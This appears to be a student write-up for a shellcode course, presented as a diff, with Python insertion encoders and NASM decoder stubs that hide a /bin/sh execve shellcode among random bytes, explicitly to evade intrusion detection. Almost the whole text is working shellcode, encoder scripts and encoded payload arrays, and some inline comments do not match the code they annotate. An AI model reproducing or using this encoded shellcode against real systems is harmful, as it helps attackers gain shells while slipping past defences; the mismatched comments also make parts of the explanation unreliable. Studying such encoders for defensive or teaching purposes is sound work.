@@ -1,0 +1,142 @@
+Insertion encoder/decoder shellcode
+For this solution I decided to incorporate the homework and the assignment and put two random characters between two legitimate shellcode values.
+Key:
+Legit = Legitimate piece of shellcode
+Random = Bogus character placed to evade IDS.
+-----------------------------------------------------------------
+|Legit |Legit |Random |Random |Legit |Legit |Random |Random|.....
+-----------------------------------------------------------------
+The code that encodes the shellcode is a simple python script shown below
+** It should be noted that the shellcode is a basic /bin/sh shellcode
+#!/usr/bin/python
+import random
+# Python random double insertion Encoder 
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80")
+
+encoded = ""
+encoded2 = ""
+counter = 1
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+	y = x
+	encoded += '0x'
+	encoded += '%02x,' % y
+	if counter == 2 :
+		encoded += '0x%02x,' % random.randint(1,254)
+		encoded += '0x%02x,' % random.randint(1,254)
+		counter = 0
+	counter += 1
+	
+print encoded
+
+print 'Len: %d' % len(bytearray(shellcode))
+
+The code below shows the decoder stub which should decode the bin/sh shellcode to give us back our original /bin/sh shellcode.
+
+; Filename: double_random_insertion-decoder.nasm
+; Author: evil_comrade
+;
+; Purpose: Removes two random x-ters between the legitimate shellcode
+
+global _start			
+section .text
+_start:
+
+	jmp short call_shellcode
+
+decoder:
+	pop esi
+	lea edi, [esi +2]             ; make edi point to the first nonsense x-ter
+	xor eax, eax		 
+	mov al, 1		      ; load 1 into eax
+	xor ebx, ebx
+
+decode: 
+	mov bx, WORD [esi + eax +1]   ; move the first bogus x-ter into ebx register 
+	xor bx, 0xffff                ; xor ebx (0xff,0xff) to check and make sure its a zero
+	jz short EncodedShellcode     ;this flag ensures that the zero flag is set and is a signal                              ;to the end of the decoding process since
+	mov bx, WORD [esi + eax + 3]  ; this initially moves 0xc0 to bl (ebx)
+	mov WORD [edi], bx            ; bl is then moved to edi
+	inc edi			      ; increase edi twice so that it points next byte (0x50) in shellcode
+	inc edi
+	add al, 4		      ; eax is then increased by 2 so as to point to the next bogus x-ter
+	jmp short decode	      ; jumps backwards to continue the decoding
+
+; once the zero flag is set, it signals the end of the decoding process. Thats the point of the 
+; two 0xffs at the end of the encoded shellcode 
+; we use two values one to keep track of the bogus random x-ters as we move along and the other to move along
+call_shellcode:
+
+	call decoder
+	EncodedShellcode: db 0x31,0xc0,0x4e,0x79,0x50,0x68,0x81,0x2e,0x2f,0x2f,0x59,0x85,0x73,0x68,0x90,0xd1,0x68,0x2f,0x69,0x66,0x62,0x69,0x0a,0xde,0x6e,0x89,0xb7,0x62,0xe3,0x50,0xb8,0xb8,0x89,0xe2,0xc6,0xcd,0x53,0x89,0x94,0x72,0xe1,0xb0,0x04,0x52,0x08,0x40,0x60,0xd5,0x40,0x40,0xfb,0x47,0xcd,0x80,0xd2,0x98,0xff, 0xff
+
+Still on the subject of insertion, I wrote another encoder decoder based on Vivek's poor man's encoder/decoder. The python script below first reverses the shellcode and then inserts a random character between each value. 
+
+#!/usr/bin/python
+
+# Python Insertion Encoder 
+import random
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80")
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode)[::-1] :
+	encoded += '\\x'
+	encoded += '%02x' % x
+	encoded += '\\x%02x' % random.randint(1,254)
+
+	encoded2 += '0x'
+	encoded2 += '%02x,' % x
+	encoded2 += '0x%02x,' % random.randint(1,254)
+
+
+print encoded
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+
+**Note that the random characters generared dont include 255 (0xff) as we use it to signal the end of our shellcode.
+
+Decoder
+;Decodes reversed shellcode and removes a random character between every two characters
+;works with encode_reverse.py
+global _start
+section .text
+_start:
+	jmp short shellcode 
+decoder:
+	pop esi
+	lea edi, [esi +1]            
+	xor eax, eax		 
+	mov al, 1		    
+	xor ebx, ebx
+
+decode: 
+	mov bl, byte [esi + eax]   
+	xor bl, 0xff              
+	jz short InvertShellcode
+	mov bl, byte [esi + eax + 1]
+	mov byte [edi], bl         
+	inc edi			  
+	add al, 2		 
+	jmp short decode	
+InvertShellcode:
+	xor ecx, ecx
+	mov cl, 7
+decode2:
+	mov eax, dword [esi]
+	bswap eax
+	push eax
+	add esi, 4
+	loop decode2
+	jmp esp	
+shellcode:
+	call decoder
+	ReversedShellcode: db 0x80,0x36,0xcd,0xf4,0x40,0xaf,0x40,0x9d,0x40,0x52,0x08,0xa3,0xb0,0x6c,0xe1,0xa0,0x89,0xc4,0x53,0x87,0xe2,0x7e,0x89,0xee,0x50,0x52,0xe3,0x9b,0x89,0x78,0x6e,0x1d,0x69,0x49,0x62,0x87,0x2f,0x5d,0x68,0x3d,0x68,0x45,0x73,0xa3,0x2f,0xba,0x2f,0x90,0x68,0x64,0x50,0x27,0xc0,0x91,0x31,0x6a,0xff
+
